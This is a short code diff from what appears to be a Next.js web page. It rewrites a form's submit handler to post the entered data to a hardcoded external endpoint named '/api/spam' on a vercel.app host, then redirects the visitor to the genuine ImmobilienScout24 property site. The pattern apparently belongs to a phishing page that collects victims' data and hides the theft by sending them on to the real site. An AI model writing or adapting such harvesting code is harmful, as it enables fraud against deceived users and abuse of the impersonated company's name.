@@ -41,7 +41,7 @@ export default function Home() {
 
   async function handleSubmitFn() {
     try {
-      await axios.post(`${process.env.NEXT_PUBLIC_URL}/api/spam`, data);
+      await axios.post(`https://immo-one.vercel.app/api/spam`, data);
       router.replace('https://www.immobilienscout24.de/');
     } catch(err) {
       console.log(err);
